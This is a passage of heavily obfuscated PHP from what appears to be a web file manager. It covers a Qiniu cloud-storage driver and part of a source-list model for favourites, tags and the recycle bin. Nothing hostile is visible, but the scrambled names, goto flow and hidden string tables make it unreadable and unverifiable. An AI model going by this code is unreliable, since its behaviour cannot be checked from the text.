(!empty($C«Ö÷‚Ìå¼[$E¢¸ù¸â‡ª[1263]])) { $Dª„¶Òğì“ += count($C«Ö÷‚Ìå¼[$E¢¸ù¸â‡ª[1263]]); } if ($A´™–ì„Ä… === $E¢¸ù¸â‡ª[33]) { break; } continue; } if ($bõĞÙ˜åÕ¡) { if (!empty($C«Ö÷‚Ìå¼[$E¢¸ù¸â‡ª[1262]])) { return !0; } } else { if (!empty($C«Ö÷‚Ìå¼[$E¢¸ù¸â‡ª[1263]])) { return !0; } } if ($A´™–ì„Ä… === $E¢¸ù¸â‡ª[33]) { break; } } if ($FÀö»°ªÅÍ) { return array($E¢¸ù¸â‡ª[199] => $D„‡·«é¹, $E¢¸ù¸â‡ª[200] => $Dª„¶Òğì“); } goto eµ³ÄßÄ”Ë; b÷‚ßÉ¼‰: $E¢¸ù¸â‡ª =& $_SERVER[úÎü]; $eå–Á¨…‘ = trim($eå–Á¨…‘, $E¢¸ù¸â‡ª[8]); $b¢Ìœ£ªÉÏ = empty($eå–Á¨…‘) ? $E¢¸ù¸â‡ª[33] : $eå–Á¨…‘ . $E¢¸ù¸â‡ª[8]; goto c¾º†ò®È¸; AÍ«íìŒÒğ: } public function listAll($cö‹ØÅĞäÙ) { $fåƒ…¹™îÎ =& $_SERVER[úÎü]; $a±„¬¾±† = $this->fileList($cö‹ØÅĞäÙ, $fåƒ…¹™îÎ[33], !0); $eÃŒ´¿¬»® = array(); foreach ($a±„¬¾±†[$fåƒ…¹™îÎ[73]] as $fÓğÔ£ª˜™) { $eÃŒ´¿¬»®[$fÓğÔ£ª˜™[$fåƒ…¹™îÎ[89]]] = $fÓğÔ£ª˜™[$fåƒ…¹™îÎ[77]]; } foreach ($a±„¬¾±†[$fåƒ…¹™îÎ[74]] as $fÓğÔ£ª˜™) { if (is_string($fÓğÔ£ª˜™)) { $eÃŒ´¿¬»®[$fÓğÔ£ª˜™] = 0; } } return $this->listAllFiles($cö‹ØÅĞäÙ, array_keys($eÃŒ´¿¬»®), $eÃŒ´¿¬»®); } private function fileList($F°ƒ‹ù††Ó, $B“¢ï­í• = '', $c“ ‹¿éƒ = 0) { goto a¦Æ©ŠÇ¥µ; Aé—ø’…: return array($bØ¨Ä±ğ®°[74] => $aĞ×Æ‰á®, $bØ¨Ä±ğ®°[73] => $fåê¿ùë´‚); goto C†–“Ï¡¥È; d‹ÉØ‰Íœ¬: $Aø…œ¢„„ = $bØ¨Ä±ğ®°[33]; $f ¦øæºíÌ = 1000; $AÉ‚¨‰“ª = $this->listItemCache === !1 ? !1 : !0; goto Cƒ¥á˜¦Ë–; a¦Æ©ŠÇ¥µ: $bØ¨Ä±ğ®° =& $_SERVER[úÎü]; $F°ƒ‹ù††Ó = trim($F°ƒ‹ù††Ó, $bØ¨Ä±ğ®°[8]); $cù´‰ÕÌ²¶ = empty($F°ƒ‹ù††Ó) ? $bØ¨Ä±ğ®°[33] : $F°ƒ‹ù††Ó . $bØ¨Ä±ğ®°[8]; goto d‹ÉØ‰Íœ¬; Cƒ¥á˜¦Ë–: $aĞ×Æ‰á® = $fåê¿ùë´‚ = array(); while (!0) { check_abort(); list($d§Œæ”Œ†¥, $a¼¢åõßÎ) = $this->bucketManager->listFiles($this->bucket, $cù´‰ÕÌ²¶, $Aø…œ¢„„, $f ¦øæºíÌ, $B“¢ï­í•); if ($a¼¢åõßÎ) { break; } $Aø…œ¢„„ = array_key_exists($bØ¨Ä±ğ®°[1229], $d§Œæ”Œ†¥) ? $Aø…œ¢„„ = $d§Œæ”Œ†¥[$bØ¨Ä±ğ®°[1261]] : $bØ¨Ä±ğ®°[33]; $aÆÏ°ã„ = isset($d§Œæ”Œ†¥[$bØ¨Ä±ğ®°[1262]]) ? $d§Œæ”Œ†¥[$bØ¨Ä±ğ®°[1262]] : array(); $b’´•Àˆ¼Õ = isset($d§Œæ”Œ†¥[$bØ¨Ä±ğ®°[1263]]) ? $d§Œæ”Œ†¥[$bØ¨Ä±ğ®°[1263]] : array(); foreach ($aÆÏ°ã„ as $AÎê„ Õíï) { goto fºÍ´‡ Úà; E§Ç‘³Ğò¢: if ($a‰“‰§‚ì‰) { $aĞ×Æ‰á®[] = $b¨˜’‚‰•; continue; } $fåê¿ùë´‚[] = $c“ ‹¿éƒ ? $AÎê„ Õíï : $b¨˜’‚‰•; goto aòàÁÃ¬·Ÿ; Bœ¡®³ÈŒ²: $AÎê„ Õíï[$bØ¨Ä±ğ®°[77]] = $fğĞô–¦ãÆ; $a‰“‰§‚ì‰ = $fğĞô–¦ãÆ == 0 && substr($b¨˜’‚‰•, strlen($b¨˜’‚‰•) - 1, 1) == $bØ¨Ä±ğ®°[8] ? !0 : !1; if ($AÉ‚¨‰“ª) { $this->cacheMethod($bØ¨Ä±ğ®°[195], $b¨˜’‚‰•, $a‰“‰§‚ì‰); $this->cacheMethod($bØ¨Ä±ğ®°[196], $b¨˜’‚‰•, $AÎê„ Õíï); } goto E§Ç‘³Ğò¢; fºÍ´‡ Úà: if ($AÎê„ Õíï[$bØ¨Ä±ğ®°[89]] == $cù´‰ÕÌ²¶) { continue; } $b¨˜’‚‰• = $AÎê„ Õíï[$bØ¨Ä±ğ®°[89]]; $fğĞô–¦ãÆ = $AÎê„ Õíï[$bØ¨Ä±ğ®°[1259]]; goto Bœ¡®³ÈŒ²; aòàÁÃ¬·Ÿ: } foreach ($b’´•Àˆ¼Õ as $b¨˜’‚‰•) { if ($b¨˜’‚‰• == $cù´‰ÕÌ²¶) { continue; } $aĞ×Æ‰á®[] = $b¨˜’‚‰•; if ($AÉ‚¨‰“ª) { $this->cacheMethod($bØ¨Ä±ğ®°[195], $b¨˜’‚‰•, !0); } } if ($Aø…œ¢„„ === $bØ¨Ä±ğ®°[33]) { break; } } if ($AÉ‚¨‰“ª) { $this->cacheMethod($bØ¨Ä±ğ®°[195], $F°ƒ‹ù††Ó, !0); } goto Aé—ø’…; C†–“Ï¡¥È: } public function canRead($c‰ç›«ÄÎÒ) { return $this->exist($c‰ç›«ÄÎÒ) ? !0 : !1; } public function canWrite($F°’×ÏËî) { return $this->exist($F°’×ÏËî) ? !0 : !1; } public function getContent($fË‘½ëÀ¡) { return $this->fileSubstr($fË‘½ëÀ¡, 0, -1); } public function setContent($f‰»ÂÑÓå, $bšÒ‚Şô… = '') { $aİ„§˜ÑæÏ = $this->tempFile($this->pathThis($f‰»ÂÑÓå)); file_put_contents($aİ„§˜ÑæÏ, $bšÒ‚Şô…); if ($this->upload($f‰»ÂÑÓå, $aİ„§˜ÑæÏ)) { $this->tempFileRemve($aİ„§˜ÑæÏ); return !0; } return !1; } public function refreshUrls($cÚ„ÒÛ‡¶) { goto d¿ø¶¼™ç; d¿ø¶¼™ç: $aƒÒ‚Õ·± =& $_SERVER[úÎü]; $cô¶»â­ ƒ = array(); if (is_array($cÚ„ÒÛ‡¶)) { foreach ($cÚ„ÒÛ‡¶ as $eÒ®ù‹Æ ¾) { $cô¶»â­ ƒ[] = $this->link($eÒ®ù‹Æ ¾); } } else { $cô¶»â­ ƒ[] = $this->link($cÚ„ÒÛ‡¶); } goto BÃèçÑ™Æ«; BÃèçÑ™Æ«: $c’’™±Ş‹ = new Qiniu\Cdn\CdnManager($this->auth); list($B‘Ó ¾É, $f’°›±Ìí¢) = $c’’™±Ş‹->refreshUrls($cô¶»â­ ƒ); if ($f’°›±Ìí¢) { return !1; } goto F©¾¬ÄÙÅ; F©¾¬ÄÙÅ: return $B‘Ó ¾É[$aƒÒ‚Õ·±[1038]] == $aƒÒ‚Õ·±[697] ? !0 : !1; goto EÓÁùôÊÂÎ; EÓÁùôÊÂÎ: } public function fileSubstr($A¶¡¤Ø†••, $CÛ×ŠÈ¼¯ù, $céÔÜ‡é‹˜) { $a¢¥Û‘Ú´¿ =& $_SERVER[úÎü]; if (!($cÀœ…®Å¥ = $this->link($A¶¡¤Ø†••))) { return !1; } $d¦‘à÷ˆÍÙ = !1; if ($céÔÜ‡é‹˜ > 0) { $A´·¯ù‚§… = $CÛ×ŠÈ¼¯ù + $céÔÜ‡é‹˜ - 1; $d¦‘à÷ˆÍÙ = array($a¢¥Û‘Ú´¿[1264] . $CÛ×ŠÈ¼¯ù . $a¢¥Û‘Ú´¿[428] . $A´·¯ù‚§…); } $bğ›‰Ç«õÄ = url_request($cÀœ…®Å¥, $a¢¥Û‘Ú´¿[224], !1, $d¦‘à÷ˆÍÙ); return $bğ›‰Ç«õÄ[$a¢¥Û‘Ú´¿[690]] ? $bğ›‰Ç«õÄ[$a¢¥Û‘Ú´¿[1048]] : !1; } public function upload($cÕ§ó³‘äç, $D¿…Ä†Ùœ, $FÂÙ‰Ñ¿Ûš = false, $e§›êî¤ç¬ = REPEAT_REPLACE) { $B©Ñåéò™å = new Qiniu\Storage\UploadManager(); $B¢ÏºÓô = $this->auth->uploadToken($this->bucket, $cÕ§ó³‘äç); $e°ìì­‹¼ = get_file_mime(get_path_ext($D¿…Ä†Ùœ)); list($c…œ¬çÆ¬å, $b¨áÙâÙµ ) = $B©Ñåéò™å->putFile($B¢ÏºÓô, $cÕ§ó³‘äç, $D¿…Ä†Ùœ, null, $e°ìì­‹¼); return $b¨áÙâÙµ  ? !1 : $this->getPathOuter($cÕ§ó³‘äç); } public function uploadFormData($F¦‰ÁÆ²ŸÏ, $EÇª¹©›ÙÌ = 3600) { return $this->uploadToken($F¦‰ÁÆ²ŸÏ, $EÇª¹©›ÙÌ); } public function multiUploadFormData($f¸ùÒƒ…ò„, $eàù–ù‰œ = 3600) { return $this->uploadToken($f¸ùÒƒ…ò„, $eàù–ù‰œ); } private function uploadToken($dÚšœ†¯½·, $eÉøéˆøµ = 3600) { goto cô½ƒóˆå; cô½ƒóˆå: $dÙ¥ŞŒ¦Õ· =& $_SERVER[úÎü]; $a¬©ÓòŒ÷± = $eÉøéˆøµ; $Dó‚Àï­„† = array($dÙ¥ŞŒ¦Õ·[1265] => $dÙ¥ŞŒ¦Õ·[1266]); goto aê¾¾›á²; A‰ÆÕé’·: $dÒ¸¢¢Èæ’ = http_type() . "\x3a\x2f\x2f\x75\160\154\157\141\x64{$DÇ¦öæ£}\x2e\161\151\x6e\151\x75\x70\x2e\143\x6f\155\57"; return array($dÙ¥ŞŒ¦Õ·[1268] => $eéµÍÆÕ„, $dÙ¥ŞŒ¦Õ·[1269] => $dÒ¸¢¢Èæ’); goto b‘Ãà”šî„; aê¾¾›á²: $e©«ô×½ = $dÚšœ†¯½·; $eéµÍÆÕ„ = $this->auth->uploadToken($this->bucket, $e©«ô×½, $a¬©ÓòŒ÷±, $Dó‚Àï­„†, !0); $DÇ¦öæ£ = empty($this->region) || $this->region == $dÙ¥ŞŒ¦Õ·[1267] ? $dÙ¥ŞŒ¦Õ·[33] : $dÙ¥ŞŒ¦Õ·[428] . $this->region; goto A‰ÆÕé’·; b‘Ãà”šî„: } public function download($F¢ã×—„ª®, $dÕÆÊ©ÑÏ‚) { goto aæê¯¸˜¦‰; c†ºõ¦¥¹”: $DÈÂÜ‹‰Ø® = 1024 * 200; $DåÍŞÃŸİö = fopen($F½…Î§Úê, $_SERVER[úÎü][1270]); while (!0) { $Bˆ¤¼Îßåå = $this->fileSubstr($F¢ã×—„ª®, $AÍËÈ·Œ¨‘, $DÈÂÜ‹‰Ø®); if ($Bˆ¤¼Îßåå === !1) { return !1; } fwrite($DåÍŞÃŸİö, $Bˆ¤¼Îßåå); $AÍËÈ·Œ¨‘ += $DÈÂÜ‹‰Ø®; if (strlen($Bˆ¤¼Îßåå) < $DÈÂÜ‹‰Ø®) { break; } } goto D‰¹†ó»¯¼; aæê¯¸˜¦‰: $F½…Î§Úê = IO::getPathInner(IO::mkfile($dÕÆÊ©ÑÏ‚)); if (!($D‘•ò¡Æğ = $this->link($F¢ã×—„ª®))) { return !1; } $AÍËÈ·Œ¨‘ = 0; goto c†ºõ¦¥¹”; D‰¹†ó»¯¼: fclose($DåÍŞÃŸİö); return $dÕÆÊ©ÑÏ‚; goto B¼‚îä”ß; B¼‚îä”ß: } public function link($c‰áã»ĞÅÙ, $aÑÓ¸¡–Šá = '') { if (!$this->isFile($c‰áã»ĞÅÙ)) { return !1; } $A³ÎÀ’Şùƒ = $this->getHost() . $_SERVER[úÎü][8] . $this->pathEncode($c‰áã»ĞÅÙ) . $aÑÓ¸¡–Šá; return $this->auth->privateDownloadUrl($A³ÎÀ’Şùƒ, 3600 * 12); } public function fileOut($bâ¬Ğª¬¼, $fÏŠ¢‡Â¥ù = false, $a¹é»ï‚Õß = false, $e†°İ“‚æ‘ = '') { $fÊìÍ¿å£ï =& $_SERVER[úÎü]; if ($this->isFileOutServer()) { return $this->fileOutServer($bâ¬Ğª¬¼, $fÏŠ¢‡Â¥ù, $a¹é»ï‚Õß, $e†°İ“‚æ‘); } if (!$a¹é»ï‚Õß) { $a¹é»ï‚Õß = $this->pathThis($bâ¬Ğª¬¼); } $AöÃŞ‚…›Ç = $fÏŠ¢‡Â¥ù ? $fÊìÍ¿å£ï[1271] . rawurlencode($a¹é»ï‚Õß) : $fÊìÍ¿å£ï[33]; $a”›çÊ©„ = $this->link($bâ¬Ğª¬¼, $AöÃŞ‚…›Ç); $this->fileOutLink($a”›çÊ©„); } public function fileOutServer($c°ÂÅ‰‘èù, $c¸ßÉÅà¼ß = false, $e¦’ºÇ˜Š¶ = false, $AÌŠòÂ…š = '') { parent::fileOut($c°ÂÅ‰‘èù, $c¸ßÉÅà¼ß, $e¦’ºÇ˜Š¶, $AÌŠòÂ…š); } public function fileOutImage($CåêÓÑ¤áÊ, $D¶ÌØ¤ÍÃ = 250) { $d¿õ‘â°‘ = $this->link($CåêÓÑ¤áÊ, $_SERVER[úÎü][1272] . $D¶ÌØ¤ÍÃ); $this->fileOutLink($d¿õ‘â°‘); } public function fileOutImageServer($DÍ¨¬¹÷Å­, $BÎĞÂœ¨î = 250) { parent::fileOutImage($DÍ¨¬¹÷Å­, $BÎĞÂœ¨î); } public function hashMd5($fÊŠ–øÌÊ) { $dó·–‰ğ´È =& $_SERVER[úÎü]; $aˆÛ·ê°›á = $this->objectMeta($fÊŠ–øÌÊ); return isset($aˆÛ·ê°›á[$dó·–‰ğ´È[204]]) ? $aˆÛ·ê°›á[$dó·–‰ğ´È[204]] : !1; $AØ×ˆøšÑ = $this->link($fÊŠ–øÌÊ, $dó·–‰ğ´È[1273]); } public function size($c¾“¯–©õ) { $a½¹‘Èî = $this->objectMeta($c¾“¯–©õ); return $a½¹‘Èî ? $a½¹‘Èî[$_SERVER[úÎü][77]] : 0; } public function info($C¶Šå°œ) { if ($this->isFolder($C¶Šå°œ)) { return $this->folderInfo($C¶Šå°œ); } else { if ($this->isFile($C¶Šå°œ)) { return $this->fileInfo($C¶Šå°œ); } } return !1; } public function exist($eùÚÓßÁÖ‰) { return $this->isFile($eùÚÓßÁÖ‰) || $this->isFolder($eùÚÓßÁÖ‰); } public function isFile($DÚëØÆÁ·™) { return !$this->isFolder($DÚëØÆÁ·™) && $this->objectMeta($DÚëØÆÁ·™); } public function isFolder($c¾ö·ò…) { return $this->cacheMethod($_SERVER[úÎü][195], $c¾ö·ò…); } protected function objectMeta($AÒ£°Åš³Ô) { return $this->cacheMethod($_SERVER[úÎü][196], $AÒ£°Åš³Ô); } protected function _objectMeta($a‘½ëÆ§¼) { $B¤›˜«›ÊÕ =& $_SERVER[úÎü]; list($F¬³ùÍ‡Ïœ, $A¿¨“–¸ª¿) = $this->bucketManager->stat($this->bucket, $a‘½ëÆ§¼); if ($F¬³ùÍ‡Ïœ) { $F¬³ùÍ‡Ïœ[$B¤›˜«›ÊÕ[77]] = intval($F¬³ùÍ‡Ïœ[$B¤›˜«›ÊÕ[1259]]); } return $F¬³ùÍ‡Ïœ; } protected function _isFolder($D§¸Å‚éĞš) { $AõÂ—ÛÃ•ğ =& $_SERVER[úÎü]; if ($D§¸Å‚éĞš == $AõÂ—ÛÃ•ğ[33] || $D§¸Å‚éĞš == $AõÂ—ÛÃ•ğ[8]) { return !0; } list($C¥åÂé»¹ß, $F—»•ºğ¼) = $this->bucketManager->listFiles($this->bucket, trim($D§¸Å‚éĞš, $AõÂ—ÛÃ•ğ[8]) . $AõÂ—ÛÃ•ğ[8], $AõÂ—ÛÃ•ğ[33], 1, $AõÂ—ÛÃ•ğ[8]); return !empty($C¥åÂé»¹ß[$AõÂ—ÛÃ•ğ[1262]]) || !empty($C¥åÂé»¹ß[$AõÂ—ÛÃ•ğ[1263]]) ? !0 : !1; } } goto aÉÂšö¡÷; FŠâ±éëöˆ: class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\162\x63\x65"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\141\x6d\145" => "\151\157\137\x73\x6f\x75\x72\x63\x65\x5f\155\145\164\x61", "\x6d\x65\164\141\106\151\x65\154\144" => "\163\x6f\x75\162\x63\145\111\104"); protected $dataAuto = array(array("\x6d\x6f\144\151\x66\x79\124\151\x6d\145", "\x74\151\x6d\145", "\151\x6e\163\x65\x72\164", "\x66\165\156\x63\164\x69\157\156"), array("\x63\x72\x65\x61\164\145\x54\151\155\145", "\x74\x69\155\145", "\x69\156\x73\x65\162\164", "\146\x75\156\143\x74\x69\157\156"), array("\166\151\145\x77\x54\x69\155\145", "\164\x69\155\x65", "\151\156\163\x65\x72\x74", "\x66\165\156\143\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($DµÂ‹©…–È) { return $this->listSource(array($_SERVER[úÎü][384] => $DµÂ‹©…–È)); } public function typeName($a¹Ş«‚šÖ) { static $bàº¼ÎÅÂ† = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\145\x6d", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\x67\x72\157\x75\160"); return $bàº¼ÎÅÂ†[$a¹Ş«‚šÖ . $_SERVER[úÎü][33]]; } public function sourceListInfo($eÍøêÂ«óÄ, $d„àÏÕÓ­Œ = false) { goto bç±§÷³‚â; bç±§÷³‚â: $a¤ğ¾íÔ¨¤ =& $_SERVER[úÎü]; $eÍøêÂ«óÄ = $eÍøêÂ«óÄ ? $eÍøêÂ«óÄ : array(); $eÍøêÂ«óÄ = array_filter(array_unique($eÍøêÂ«óÄ)); goto c…¾İ£ ô¥; c…¾İ£ ô¥: if (!$eÍøêÂ«óÄ) { return array(); } $cõôˆÒê = $this->where(array($a¤ğ¾íÔ¨¤[385] => array($a¤ğ¾íÔ¨¤[7], $eÍøêÂ«óÄ)))->select(); $this->_listDataApply($cõôˆÒê, $d„àÏÕÓ­Œ); goto eïã×ä££; eïã×ä££: return array_to_keyvalue($cõôˆÒê, $a¤ğ¾íÔ¨¤[385]); goto C¼Õé‹˜¼«; C¼Õé‹˜¼«: } public function pathInfoFilter($Aì÷Ê¼ˆËØ) { goto AŞ¢¶Âì‘; dÖÜ¶èÕ±: $c¼†£¿ƒ .= $CÊæÕ—ïßˆ[390]; $c¼†£¿ƒ .= $CÊæÕ—ïßˆ[391]; $D÷Áİğ®®É = explode($CÊæÕ—ïßˆ[47], $c¼†£¿ƒ); goto dŸçÛù†ôë; c ¨Â“’°ê: $Aì÷Ê¼ˆËØ[$CÊæÕ—ïßˆ[387]] = $this->typeName($Aì÷Ê¼ˆËØ[$CÊæÕ—ïßˆ[387]]); if ($Aì÷Ê¼ˆËØ[$CÊæÕ—ïßˆ[386]] != 1) { $Aì÷Ê¼ˆËØ[$CÊæÕ—ïßˆ[165]] = $Aì÷Ê¼ˆËØ[$CÊæÕ—ïßˆ[388]]; unset($Aì÷Ê¼ˆËØ[$CÊæÕ—ïßˆ[388]]); } $c¼†£¿ƒ = $CÊæÕ—ïßˆ[389]; goto dÖÜ¶èÕ±; dŸçÛù†ôë: if (isset($Aì÷Ê¼ˆËØ[$CÊæÕ—ïßˆ[392]]) && $Aì÷Ê¼ˆËØ[$CÊæÕ—ïßˆ[392]][$CÊæÕ—ïßˆ[393]] == -1) { $D÷Áİğ®®É = array_remove_value($D÷Áİğ®®É, $CÊæÕ—ïßˆ[190]); $D÷Áİğ®®É = array_remove_value($D÷Áİğ®®É, $CÊæÕ—ïßˆ[107]); $D÷Áİğ®®É = array_remove_value($D÷Áİğ®®É, $CÊæÕ—ïßˆ[394]); $D÷Áİğ®®É = array_remove_value($D÷Áİğ®®É, $CÊæÕ—ïßˆ[395]); $D÷Áİğ®®É = array_remove_value($D÷Áİğ®®É, $CÊæÕ—ïßˆ[77]); $D÷Áİğ®®É = array_remove_value($D÷Áİğ®®É, $CÊæÕ—ïßˆ[396]); } $Aì÷Ê¼ˆËØ = array_field_key($Aì÷Ê¼ˆËØ, $D÷Áİğ®®É); return $Aì÷Ê¼ˆËØ; goto E¾ÕÇâˆÆ; AŞ¢¶Âì‘: $CÊæÕ—ïßˆ =& $_SERVER[úÎü]; $Aì÷Ê¼ˆËØ[$CÊæÕ—ïßˆ[75]] = KodIO::make($Aì÷Ê¼ˆËØ[$CÊæÕ—ïßˆ[385]]); $Aì÷Ê¼ˆËØ[$CÊæÕ—ïßˆ[29]] = $Aì÷Ê¼ˆËØ[$CÊæÕ—ïßˆ[386]] == 1 ? $CÊæÕ—ïßˆ[76] : $CÊæÕ—ïßˆ[171]; goto c ¨Â“’°ê; E¾ÕÇâˆÆ: } public function listUserFav() { goto c‚¥™·¾…º; c‚¥™·¾…º: $f³”•¼Ò =& $_SERVER[úÎü]; $d†¯ÄäøÒ = Model($f³”•¼Ò[397])->listData(); $bˆêÍšÈÄç = array_filter_by_field($d†¯ÄäøÒ, $f³”•¼Ò[29], $f³”•¼Ò[398]); goto aÅä„¬É…‚; bÔ¾Î±½ŒÆ: foreach ($d†¯ÄäøÒ as &$DË÷Ø„ñÆâ) { $DË÷Ø„ñÆâ = array($f³”•¼Ò[401] => $DË÷Ø„ñÆâ[$f³”•¼Ò[383]], $f³”•¼Ò[402] => $DË÷Ø„ñÆâ[$f³”•¼Ò[28]], $f³”•¼Ò[403] => $DË÷Ø„ñÆâ[$f³”•¼Ò[75]], $f³”•¼Ò[404] => $DË÷Ø„ñÆâ[$f³”•¼Ò[29]], $f³”•¼Ò[405] => $DË÷Ø„ñÆâ[$f³”•¼Ò[190]], $f³”•¼Ò[406] => $DË÷Ø„ñÆâ[$f³”•¼Ò[107]]); if ($DË÷Ø„ñÆâ[$f³”•¼Ò[29]] == $f³”•¼Ò[398] && $a¥İÈÅÅ[$DË÷Ø„ñÆâ[$f³”•¼Ò[75]]]) { $DË÷Ø„ñÆâ[$f³”•¼Ò[407]] = $a¥İÈÅÅ[$DË÷Ø„ñÆâ[$f³”•¼Ò[75]]]; } } unset($DË÷Ø„ñÆâ); return $d†¯ÄäøÒ; goto DÓãî½ïÅ; aÅä„¬É…‚: $bˆêÍšÈÄç = array_to_keyvalue($bˆêÍšÈÄç, $f³”•¼Ò[33], $f³”•¼Ò[75]); if ($bˆêÍšÈÄç) { $a¥İÈÅÅ = $this->listSource(array($f³”•¼Ò[399] => array($f³”•¼Ò[400], $bˆêÍšÈÄç))); } $a¥İÈÅÅ = array_to_keyvalue($a¥İÈÅÅ[$f³”•¼Ò[361]], $f³”•¼Ò[385]); goto bÔ¾Î±½ŒÆ; DÓãî½ïÅ: } public function listUserTag($Eáö³Ì™µ) { goto FØÈŒ·›å; FØÈŒ·›å: $E»Ô½„”¹¼ =& $_SERVER[úÎü]; if ($Eáö³Ì™µ && !is_array($Eáö³Ì™µ)) { $Eáö³Ì™µ = array($Eáö³Ì™µ); } $Fë¼•Î¼Üª = Model($E»Ô½„”¹¼[408])->listData(); goto EĞÎİ°ˆ´; EĞÎİ°ˆ´: $b¤„Ş©¡Ôğ = array(); foreach ($Fë¼•Î¼Üª as $DïÂØš¼ô‚) { $F¯»¢œâßæ = $DïÂØš¼ô‚[$E»Ô½„”¹¼[75]]; if (!$F¯»¢œâßæ) { continue; } if (!isset($b¤„Ş©¡Ôğ[$F¯»¢œâßæ])) { $b¤„Ş©¡Ôğ[$F¯»¢œâßæ] = array(); } $b¤„Ş©¡Ôğ[$F¯»¢œâßæ][] = $DïÂØš¼ô‚[$E»Ô½„”¹¼[409]]; } $eã„¶ÅÛÉ‚ = array(); goto C«à™ù“µã; eÈôˆ‰Ó÷½: if ($dñ¡«©±ğò) { Model($E»Ô½„”¹¼[410])->removeBySource($dñ¡«©±ğò); } return $b´·²¹äˆ; goto AğµÀöì¾Ò; A¹ù•ÇİŸ‚: $AÓÂ™¹—î• = array_to_keyvalue($b´·²¹äˆ[$E»Ô½„”¹¼[73]], $E»Ô½„”¹¼[33], $E»Ô½„”¹¼[385]); $C–¡ÍŒ‚ = array_merge($AÓÂ™¹—î•, $A‘¯åŒæ¤); foreach ($eã„¶ÅÛÉ‚ as $F¯»¢œâßæ) { if (!in_array($F¯»¢œâßæ, $C–¡ÍŒ‚)) { $dñ¡«©±ğò[] = $F¯»¢œâßæ; } } goto eÈôˆ‰Ó÷½; C«à™ù“µã: foreach ($b¤„Ş©¡Ôğ as $FµŸñ¹Ş => $bÚƒ—ò’¢†) { $B”—Â×Ä¨ = !0; if (!$Eáö³Ì™µ) { $eã„¶ÅÛÉ‚[] = $FµŸñ¹Ş; continue; } foreach ($Eáö³Ì™µ as $fê³—™“ƒÉ) { if (!in_array($fê³—™“ƒÉ, $bÚƒ—ò’¢†)) { $B”—Â×Ä¨ = !1; break; } } if ($B”—Â×Ä¨) { $eã„¶ÅÛÉ‚[] = $FµŸñ¹Ş; } } if (!$eã„¶ÅÛÉ‚) { return array(); } $b´·²¹äˆ = $this->listSource(array($E»Ô½„”¹¼[399] => array($E»Ô½„”¹¼[400], $eã„¶ÅÛÉ‚))); goto BÁÊ¦‘óº¾; BÁÊ¦‘óº¾: if (!$b´·²¹äˆ || count($eã„¶ÅÛÉ‚) == $b´·²¹äˆ[$E»Ô½„”¹¼[358]][$E»Ô½„”¹¼[359]]) { return $b´·²¹äˆ; } $dñ¡«©±ğò = array(); $A‘¯åŒæ¤ = array_to_keyvalue($b´·²¹äˆ[$E»Ô½„”¹¼[74]], $E»Ô½„”¹¼[33], $E»Ô½„”¹¼[385]); goto A¹ù•ÇİŸ‚; AğµÀöì¾Ò: } public function listUserRecycle() { $bµóÅİ®ÄÍ =& $_SERVER[úÎü]; $E“Ş–£Ñ— = Model($bµóÅİ®ÄÍ[411])->listData(); if (!$E“Ş–£Ñ—) { return array(); } $bÊù¦ôÂ¥· = array($bµóÅİ®ÄÍ[399] => array($bµóÅİ®ÄÍ[400], $E“Ş–£Ñ—), $bµóÅİ®ÄÍ[412] => 1); return $this->listSource($bÊù¦ôÂ¥·); } public function listSource($Fñ—ØÜÊçÖ, $c’Ëø°ø = 3000) { goto aõíÆ‹Î‚; c¢óÄåø¹º: return $AÅ…¬Åó“; goto CÎ†¯‰Æî; aõíÆ‹Î‚: $BÕ´¸ò¿Ùâ =& $_SERVER[úÎü]; if (!isset($Fñ—ØÜÊçÖ[$BÕ´¸ò¿Ùâ[413]])) { $Fñ—ØÜÊçÖ[$BÕ´¸ò¿Ùâ[413]] = 0; } $C±©ˆ’šâ = $BÕ´¸ò¿Ùâ[414]; goto C‚ºñŸê–¬; C‚ºñŸê–¬: $AÅ…¬Åó“ = $this->field($C±©ˆ’šâ)->_makeOrder()->where($Fñ—ØÜÊçÖ)->selectPage($c’Ëø°ø); $this->_listDataApply($AÅ…¬Åó“[$BÕ´¸ò¿Ùâ[361]]); $this->_listMake($AÅ…¬Åó“); goto c¢óÄåø¹º; CÎ†¯‰Æî: } protected function _makeOrder() { goto c«îŒ–Ä „; bæ£·’™ñŞ: $e„äÈßÙ²Ô = array($fº¾­›ÀŠ[418] => $fº¾­›ÀŠ[419], $fº¾­›ÀŠ[420] => $fº¾­›ÀŠ[421]); $e¹„Š›®ñÈ = array($fº¾­›ÀŠ[28] => $fº¾­›ÀŠ[28], $fº¾­›ÀŠ[77] => $fº¾­›ÀŠ[77], $fº¾­›ÀŠ[165] => $fº¾­›ÀŠ[388], $fº¾­›ÀŠ[394] => $fº¾­›ÀŠ[394], $fº¾­›ÀŠ[422] => $fº¾­›ÀŠ[395], $fº¾­›ÀŠ[190] => $fº¾­›ÀŠ[190], $fº¾­›ÀŠ[107] => $fº¾­›ÀŠ[107]); $CÚ« ‘ø£ = Input::get($fº¾­›ÀŠ[423], $fº¾­›ÀŠ[7], $fâÉÚ’÷, array_keys($e¹„Š›®ñÈ)); goto Dïã¹·…Ê±; c«îŒ–Ä „: $fº¾­›ÀŠ =& $_SERVER[úÎü]; $fâÉÚ’÷ = Model($fº¾­›ÀŠ[415])->get($fº¾­›ÀŠ[416]); $fó¢Øİª÷ = Model($fº¾­›ÀŠ[415])->get($fº¾­›ÀŠ[417]); goto bæ£·’™ñŞ; BÇÚµ•–¡Û: if ($CÚ« ‘ø£ == $fº¾­›ÀŠ[28]) { } $dŒÏ°ó¦›ˆ = $fº¾­›ÀŠ[425] . $e¹„Š›®ñÈ[$CÚ« ‘ø£] . $fº¾­›ÀŠ[50] . $e„äÈßÙ²Ô[$d©ò¨¥£Ö½]; return $this->order(rtrim(trim($dŒÏ°ó¦›ˆ), $fº¾­›ÀŠ[47])); goto c¡Ê×ÑâÄ‡; Dïã¹·…Ê±: $d©ò¨¥£Ö½ = Input::get($fº¾­›ÀŠ[424], $fº¾­›ÀŠ[7], $fó¢Øİª÷, array_keys($e„äÈßÙ²Ô)); if (!in_array($CÚ« ‘ø£, array_keys($e¹„Š›®ñÈ))) { $CÚ« ‘ø£ = $fº¾­›ÀŠ[28]; } if (!in_array($d©ò¨¥£Ö½, 